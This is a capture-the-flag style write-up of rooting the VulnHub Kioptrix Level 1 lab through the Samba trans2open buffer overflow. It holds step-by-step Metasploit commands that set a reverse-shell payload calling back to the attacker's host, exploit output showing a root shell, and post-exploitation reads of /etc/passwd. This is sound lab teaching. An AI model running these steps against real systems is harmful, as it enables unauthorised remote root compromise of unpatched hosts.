# Kioptrix Level 1 — Penetration Testing Writeup

**Author:** anushdhkl
**Date:** March 26, 2026
**Difficulty:** Beginner
**Platform:** VulnHub
**Machine:** Kioptrix Level 1
**Goal:** Obtain root shell

---

## Table of Contents

1. [Lab Setup](#lab-setup)
2. [Reconnaissance](#reconnaissance)
3. [Vulnerability Identification](#vulnerability-identification)
4. [Exploitation](#exploitation)
5. [Post-Exploitation](#post-exploitation)
6. [What is a Buffer Overflow?](#what-is-a-buffer-overflow)
7. [Troubleshooting: IP Address Conflict](#troubleshooting-ip-address-conflict)
8. [Key Takeaways](#key-takeaways)
9. [Tools Used](#tools-used)

---

## Lab Setup

| Role     | OS                        | IP Address  |
|----------|---------------------------|-------------|
| Target   | Kioptrix Level 1 (Red Hat Linux, ~2001) | 10.0.2.15 |
| Attacker | Kali Linux                | 10.0.2.20   |
| Network  | Oracle VirtualBox NAT Network | —        |

**VulnHub link:** https://www.vulnhub.com/entry/kioptrix-level-1-1,22/

> **Note:** Both machines were run inside VirtualBox on the same NAT network so they could communicate with each other in an isolated environment — no real systems were touched.

---

## Reconnaissance

### Step 1 — Port Scanning with Nmap

The first thing any penetration tester does is **scan the target** to find out what services are running and what versions they are. Think of it like knocking on every door of a building to see which ones are open and what's behind them.

```bash
nmap -sV -sC 10.0.2.15
```

**Breaking down the command:**
- `nmap` — the scanning tool
- `-sV` — detect the **version** of each service (e.g., "is it Apache 1.3 or 2.4?")
- `-sC` — run default **scripts** that check for common misconfigurations
- `10.0.2.15` — the IP address of our target machine

**Relevant output:**

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 2.9p2
80/tcp  open  http        Apache httpd 1.3.20
139/tcp open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp open  ssl/https   Apache httpd 1.3.20
```

> **Key finding:** Port **139** is running **Samba 2.2.x** — a file-sharing service. This is an old version with a known critical vulnerability.

![Nmap Scan Results](screenshots/01-nmap-scan.png)
*Screenshot placeholder: nmap output showing open ports and service versions*

---

## Vulnerability Identification

### Step 2 — Researching the Samba Version

Samba 2.2.x has a well-documented vulnerability called **trans2open** — a buffer overflow bug that allows an attacker to execute arbitrary code as **root** on the target machine.

**Why is this serious?**
The service runs with administrator (root) privileges. If we can exploit the bug, we gain full control of the system.

**CVE reference:** CVE-2003-0201
**Vulnerability type:** Stack-based Buffer Overflow (Remote Code Execution)

---

## Exploitation

### Step 3 — Opening Metasploit

Metasploit is a widely-used penetration testing framework that contains hundreds of pre-built exploits. Think of it as a toolkit where each tool targets a specific vulnerability.

```bash
msfconsole
```

![Metasploit Console](screenshots/02-msfconsole-open.png)
*Screenshot placeholder: msfconsole startup screen*

---

### Step 4 — Searching for the Exploit

```
msf6 > search samba 2.2
```

**What this does:** Searches Metasploit's database for any exploit that matches "samba 2.2". We're looking for something that targets the vulnerability we identified.

![Metasploit Search](screenshots/03-search-samba.png)
*Screenshot placeholder: search results showing trans2open exploit*

---

### Step 5 — Loading the Exploit

```
msf6 > use exploit/linux/samba/trans2open
```

**What this does:** Selects the `trans2open` exploit module and loads it so we can configure and run it.

---

### Step 6 — Configuring the Exploit

```
msf6 exploit(trans2open) > set RHOSTS 10.0.2.15
msf6 exploit(trans2open) > set PAYLOAD linux/x86/shell_reverse_tcp
msf6 exploit(trans2open) > set LHOST 10.0.2.20
```

**Breaking down each option:**

| Option    | Value                          | Meaning |
|-----------|--------------------------------|---------|
| `RHOSTS`  | `10.0.2.15`                    | **R**emote **HOST** — the target machine's IP |
| `PAYLOAD` | `linux/x86/shell_reverse_tcp`  | The code we want to run on the target. A **reverse shell** means the *target connects back to us*, giving us a command prompt |
| `LHOST`   | `10.0.2.20`                    | **L**ocal **HOST** — our Kali machine's IP, where the target will connect back to |

> **Reverse shell explained simply:** Instead of us connecting to the target (which firewalls often block), we trick the target into connecting to *us*. It's like instead of knocking on someone's locked door, you convince them to open their door and come find you.

![Exploit Configuration](screenshots/04-exploit-config.png)
*Screenshot placeholder: show options after setting RHOSTS, PAYLOAD, and LHOST*

---

### Step 7 — Running the Exploit

```
msf6 exploit(trans2open) > exploit
```

**What happens:** Metasploit sends a specially crafted malicious packet to port 139 (Samba). The buffer overflow vulnerability causes the server to execute our payload instead of crashing. The target machine then opens a connection back to our Kali machine, giving us a shell.

```
[*] Started reverse TCP handler on 10.0.2.20:4444
[*] Trying return address 0xbffffdfc...
[*] Command shell session 1 opened (10.0.2.20:4444 -> 10.0.2.15:32XXX)
```

> **Tip:** Multiple sessions may open because Metasploit keeps retrying. Press `Ctrl+C` once to stop new attempts, then type `sessions -i 1` to interact with the first session.

```
msf6 exploit(trans2open) > sessions -i 1
```

![Exploit Running](screenshots/05-exploit-running.png)
*Screenshot placeholder: exploit output showing session opened*

---

## Post-Exploitation

### Step 8 — Confirming Root Access

Once inside the shell, the first thing we do is confirm **who we are** on the system.

```bash
whoami
```

**Output:**
```
root
```

We have the highest level of access on this machine.

![whoami root](screenshots/06-whoami-root.png)
*Screenshot placeholder: terminal showing "root" output*

---

### Step 9 — Gathering System Information

```bash
uname -a
```

**What this does:** Displays information about the operating system kernel — useful for reporting and for identifying further vulnerabilities.

**Output:**
```
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
```

This confirms the machine is running a Linux kernel from **2001** — over 20 years old, explaining why it has so many unpatched vulnerabilities.

---

### Step 10 — Reading the User List

```bash
cat /etc/passwd
```

**What this does:** Reads the file that lists every user account on the system. On modern systems this file is less sensitive, but it still reveals usernames.

**Notable users found:** `john`, `harold`

![/etc/passwd contents](screenshots/07-passwd-file.png)
*Screenshot placeholder: /etc/passwd output showing john and harold users*

---

### Step 11 — Creating Proof of Compromise

```bash
echo "pwned by anushdhkl" > /tmp/pwned.txt
cat /tmp/pwned.txt
```

**What this does:** Creates a file in the `/tmp` directory as evidence that we successfully owned the machine. This is standard practice in CTF challenges and real penetration tests (pen testers leave "flags" or proof files for the client).

![Proof File](screenshots/08-pwned-proof.png)
*Screenshot placeholder: terminal showing pwned.txt creation and content*

---

## What is a Buffer Overflow?

Imagine a glass that holds exactly 8 oz of water. If someone tries to pour 12 oz in, the extra 4 oz spills over the edge — that overflow goes somewhere unintended.

A **buffer overflow** works the same way in computer memory:

1. A program sets aside a fixed block of memory (the "glass") to hold incoming data
2. The program doesn't check how big the incoming data is
3. An attacker sends *more* data than the buffer can hold
4. The extra data "spills over" into adjacent memory — including memory that controls *what the program does next*
5. By carefully crafting the overflow data, the attacker can overwrite that control memory with their own instructions

In Samba 2.2.x, the `trans2open` function had exactly this flaw. By sending an oversized request to port 139, we overwrote memory in a way that made the server execute our reverse shell payload instead of its normal code.

```
Normal memory layout:
[ INPUT BUFFER (safe data) ][ CONTROL DATA (return address) ]

After overflow attack:
[ INPUT BUFFER (our payload...  ...overflows into) ][ OUR CODE ADDRESS ]
                                                              ^
                                                    Now points to our shellcode!
```

---

## Troubleshooting: IP Address Conflict

### The Problem

When both Kioptrix and Kali Linux were started on the same VirtualBox NAT Network, they were **automatically assigned the same IP address** (10.0.2.15). This caused a conflict — commands sent to 10.0.2.15 could reach either machine unpredictably, making scanning and exploitation impossible.

**Symptom:** `nmap 10.0.2.15` returned results that looked like your own Kali machine, not the target.

### The Fix — Manually Assigning a Static IP to Kali

**Step 1:** Identify your network interface name on Kali:

```bash
ip a
```

Look for an interface like `eth0` or `enp0s3`.

**Step 2:** Assign a new static IP to Kali:

```bash
sudo ip addr add 10.0.2.20/24 dev eth0
sudo ip link set eth0 up
```

Replace `eth0` with your actual interface name.

**Step 3:** Verify the change:

```bash
ip a show eth0
```

You should now see `10.0.2.20` assigned to your Kali machine, while Kioptrix keeps `10.0.2.15`.

**Step 4:** Verify the two machines can see each other:

```bash
ping 10.0.2.15
```

You should get responses from the Kioptrix machine, not yourself.

> **Why this happens:** VirtualBox DHCP assigns IPs automatically. When two VMs start around the same time, they can get the same address. Static assignment bypasses DHCP and guarantees a unique IP.

---

## Key Takeaways

| # | Lesson |
|---|--------|
| 1 | **Always start with reconnaissance** — you can't exploit what you don't know exists |
| 2 | **Old, unpatched software is dangerous** — Samba 2.2.x is from 2002; patching is critical |
| 3 | **Metasploit is a powerful tool** — but understanding *why* an exploit works matters more than just running it |
| 4 | **Reverse shells bypass firewalls** — because the connection originates from the target (inside), not the attacker (outside) |
| 5 | **Buffer overflows are a classic vulnerability class** — still relevant today in embedded systems and legacy software |
| 6 | **IP conflicts can break your lab** — always verify your network setup before starting |

---

## Tools Used

| Tool        | Purpose                                      |
|-------------|----------------------------------------------|
| `nmap`      | Network scanning and service version detection |
| `msfconsole`| Metasploit Framework — exploit execution     |
| `ip`        | Linux network configuration (IP assignment)  |
| `uname`     | System information gathering                 |
| `cat`       | Reading file contents                        |

---

## References

- [VulnHub — Kioptrix Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)
- [CVE-2003-0201 — Samba trans2open Buffer Overflow](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0201)
- [Metasploit Unleashed (Free Course)](https://www.offensive-security.com/metasploit-unleashed/)
- [TryHackMe — Pre-Security Path](https://tryhackme.com/path/outline/presecurity)

---

*This writeup was completed in a controlled, isolated lab environment for educational purposes. All techniques described are only legal when performed on systems you own or have explicit written permission to test.*
